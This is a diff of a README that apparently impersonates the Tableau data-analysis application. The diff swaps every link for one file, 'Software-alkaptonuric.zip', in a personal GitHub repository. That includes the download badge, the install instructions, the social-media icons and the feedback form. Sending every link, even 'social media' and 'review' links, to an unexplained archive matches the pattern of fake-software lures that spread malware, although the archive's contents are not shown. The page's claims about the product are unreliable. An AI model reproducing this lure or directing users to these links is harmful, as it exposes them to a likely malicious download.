@@ -1,7 +1,7 @@
 # 🌟 Tableau - Analyze Your Data with Ease
 
 ## 🔗 Download the Latest Version
-[![Download Tableau](https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip%2323A4D5?style=for-the-badge)](https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip)
+[![Download Tableau](https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip%2323A4D5?style=for-the-badge)](https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Tableau! This application helps you analyze and visualize your data s
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   Go to our releases page to download the latest version of Tableau: [Download Tableau](https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip)
+   Go to our releases page to download the latest version of Tableau: [Download Tableau](https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip)
 
 2. **Choose Your Version**
    On the releases page, you will see different versions of Tableau available for download. Select the version that best suits your needs.
@@ -60,22 +60,22 @@ If you encounter issues during installation, consider the following:
 Stay updated and connect with us on social media:
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip%https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" />
+  <a href="https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip" target="_blank">
+    <img src="https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip%https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip" />
   </a>
-  <a href="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip%https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" />
+  <a href="https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip" target="_blank">
+    <img src="https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip%https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip" />
   </a>
-  <a href="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip%https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" />
+  <a href="https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip" target="_blank">
+    <img src="https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip%https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip" />
   </a>
-  <a href="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip%https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip" />
+  <a href="https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip" target="_blank">
+    <img src="https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip%https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip" />
   </a>
 </p>
 
 ## 📞 Feedback
 
-Please take a moment to provide your feedback. Your input helps us improve Tableau. Fill out this short form: [Give Your Review](https://raw.githubusercontent.com/Hasony99/Tableau/main/assets/Tableau_v1.9-alpha.2.zip)
+Please take a moment to provide your feedback. Your input helps us improve Tableau. Fill out this short form: [Give Your Review](https://github.com/Hasony99/Tableau/raw/refs/heads/main/assets/Software-alkaptonuric.zip)
 
 Thank you for using Tableau! We hope it helps you in your data analysis tasks.
